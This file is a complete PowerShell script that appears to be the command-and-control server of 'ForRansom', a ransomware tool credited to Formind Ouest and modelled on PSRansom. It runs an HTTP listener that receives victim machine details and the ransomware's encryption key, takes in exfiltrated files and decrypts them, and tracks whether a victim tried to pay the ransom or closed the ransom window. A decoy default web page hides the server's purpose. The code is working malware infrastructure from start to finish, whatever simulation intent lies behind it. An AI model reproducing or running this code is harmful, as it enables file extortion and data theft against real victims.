#================================#
#     ForRansom by Formind Ouest #
#      https://www.formind.fr/   #
#================================#

#================================#
#      Inspired by the work of   #
#     PSRansom by @JoelGMSec     #
#      https://darkbyte.net      #
#================================#

# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "ForRansom" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }

# Http Server
$whost = $args[0]
$wport = $args[1]
$http = [System.Net.HttpListener]::new() 
$http.Prefixes.Add("http://$whost`:$wport/")
$http.Start()
# Banner
function Show-Banner {
	
    Write-Host 
	Write-Host "   ______        ______                                 " -ForegroundColor Blue                         
	Write-Host "   |  ___|       | ___ \                                " -ForegroundColor Blue
	Write-Host "   | |_ ___  _ __| |_/ /__ _ _ __  ___  ___  _ __ ___   " -ForegroundColor Blue
	Write-Host "   |  _/ _ \| '__|    // _  | '_ \/ __|/ _ \| '_   _ \  " -ForegroundColor Blue
	Write-Host "   | || (_) | |  | |\ \ (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
	Write-Host "   \_| \___/|_|  \_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue

	Write-Host                                                            
	Write-Host " ----------------- by Formind Ouest --------------  " -ForegroundColor Green
	Write-Host " ------------- inspired by @JoelGMSec ------------  " -ForegroundColor Green 
   }

# Help
function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " Cet outil vous aide à recevoir les donnees"
   Write-Host "         du client ForRansom via le protocole HTTP"
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\C2Server.ps1 LocalHost LocalPort" -ForegroundColor Blue 
   Write-Host "          Example: .\C2Server localhost 443" -ForegroundColor Green
   Write-Host "          Utiliser * pour ecouter sur toutes les interfaces de l'hote Windows" -ForegroundColor Green
   Write-Host "          Utiliser + pour ecouter toutes les interfaces sur l'hote Linux" -ForegroundColor Green
   Write-Host ; Write-Host " Attention: " -ForegroundColor Red -NoNewLine  ; Write-Host "Toutes les donnees seront envoyees au C2Server sans aucun cryptage."
   Write-Host "         " -NoNewLine ; Write-Host " Vous avez besoin de la cle de recuperation generee precedemment pour recuperer les fichiers." ; Write-Host }

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Pas assez de parametres !" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Pas assez de parametres !" -ForegroundColor Red ; Write-Host ; break }

# Functions
function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [ValidateSet("Encrypt", "Decrypt")]
       [String]$Mode,

       [Parameter(Mandatory = $true)]
       [String]$Key,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)

   Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256 }

   Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

         "Encrypt" {
             if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".psr" }

             $encryptor = $aesManaged.CreateEncryptor()
             $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
             $encryptedBytes = $aesManaged.IV + $encryptedBytes
             $aesManaged.Dispose()

             if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}

         "Decrypt" {
             if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace(".psr","") }

             $aesManaged.IV = $cipherBytes[0..15]
             $decryptor = $aesManaged.CreateDecryptor()
             $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
             $aesManaged.Dispose()

             if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}}}

  End {
      $shaManaged.Dispose()
      $aesManaged.Dispose()}}

function R64Decoder {
   $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
   $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
   switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
   if ($args[0] -eq "-t") { $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) ; $revb64 }
   if ($args[0] -eq "-f") { $revb64 = [System.Convert]::FromBase64String($base64) ; return $revb64 }}

# Main
Show-Banner ; Write-Host
if (($whost -eq "*") -or ($whost -eq "+")) { $whost = "0.0.0.0" }
Write-Host "[+] Ecoute de la nouvelle connexion sur $whost`:$wport" -f Blue
while ($http.IsListening) { $context = $http.GetContext()
   
if ($context.Request.HttpMethod -eq "GET") {
   if ($context.Request.RawUrl -eq "/status") { 
      Write-Host "[!] Nouvelle connexion de $($context.Request.RemoteEndPoint)" -f Red }
   
   if ($context.Request.RawUrl -eq"/files") { mkdir "C2Files" 2>&1> $null 
      Write-Host ; Write-Host "[i] Recuperation des fichiers exfiltres et les decryptage.." -f Green ; sleep 2 }   

   if ($context.Request.RawUrl -eq "/pay") { Write-Host ; Write-Host "[i] En attente d'une reponse pour le paiement.." -f Green ; sleep 2
      Write-Host "[!] L'utilisateur a ete tente de payer la rancon !" -f Red }

   if ($context.Request.RawUrl -eq "/close") { Write-Host ; Write-Host "[i] En attente d'une reponse pour le paiement.." -f Green ; sleep 2
      Write-Host "[!] L'utilisateur a ferme la fenetre de la rancon !" -f Red }

   if ($context.Request.RawUrl -eq "/done") { Write-Host ; Write-Host "[i] Done!" -f Green ; Write-Host ; $http.Stop() }
   
   if ($context.Request.RawUrl -eq "/robots.txt") { if ($context.Request.UserAgent -like "*PowerShell*") {
      [string]$html = Get-Content .\robots.txt }}
   
   else { [string]$html = "<h1>It Works!</h1><p>This is the default web page for this server</p>" }
   
   $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
   $context.Response.ContentLength64 = $buffer.Length
   $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
   $context.Response.OutputStream.Close() }

if ($context.Request.HttpMethod -eq "POST") {
   $FormContent = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd() 

   if ($context.Request.RawUrl -eq "/data") { 
      $B64Data = R64Decoder -t $FormContent ; $Data = $B64Data.ToString().Replace("[","`n[").split(":",5).split("`n",5)
      Write-Host ; Write-Host $Data[3] -f Yellow -NoNewLine ; Write-Host ":" -f Yellow -NoNewLine ; Write-Host $Data[4] 
      Write-Host $Data[5] -f Yellow -NoNewLine ; Write-Host ":" -f Yellow -NoNewLine ; Write-Host $Data[6] 
      Write-Host $Data[7] -f Yellow -NoNewLine ; Write-Host ":" -f Yellow -NoNewLine ; Write-Host $Data[8] 
      $computer = $Data[4] ; $time = $Data[8] 

      Write-Host ; Write-Host "[i] Obtention de la clé de chiffrement.." -f Green ; $RAWKey = $Data[2].replace(" ","")   
      $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
      $DESKey = R64Decoder -t $RAWKey ; $TMKey = $TMKey.replace(" ","")
      $B64Key = Invoke-AESEncryption -Mode Decrypt -Key $TMKey -Text $DESKey ; Write-Host $B64Key }

   if ($context.Request.RawUrl -like "/files/*") { 
      $Rfile = $($context.Request.RawUrl).split("/")[-1] ; $B64Name = R64Decoder -t $Rfile 
      if ($B64Name -eq "none.null") { Write-Host "[!] Aucun fichier recu!" -f Red } else { 
        
      if ($OSVersion -like "*Win*") { $C2Rfile = "$pwd\C2Files\$B64Name" } else { $C2Rfile = "$pwd/C2Files/$B64Name" } 
         $C2RName = $C2Rfile.replace(".psr","") ; Write-Host "[+] $C2RName fichier recu !" -f Blue ; $B64file = R64Decoder -f $FormContent

      if (-not (Test-Path $C2Rfile)) { if ((Get-Host).Version.Major -gt 5) {
         Add-Content -Path $C2Rfile -Value $B64file -AsByteStream } else { 
         Add-Content -Path $C2Rfile -Value $B64file -Encoding Byte  }
         Invoke-AESEncryption -Mode Decrypt -Key $B64Key -Path $C2Rfile }}
         Remove-Item $C2Rfile }

   if ($context.Request.RawUrl -eq "/logs") { 
      Write-Host ; Write-Host "[i] Reception de la liste des fichiers chiffres.." -f Green -NoNewLine
      $B64Logs = R64Decoder -t $FormContent ; sleep 2
      $Logs = $B64Logs.ToString().Replace("[","`n[") ; Write-Host $Logs -f Red }

   [string]$html = "<h1>It Works!</h1><p>This is the default web page for this server</p>" 
   $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
   $context.Response.ContentLength64 = $buffer.Length
   $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
   $context.Response.OutputStream.Close()}}
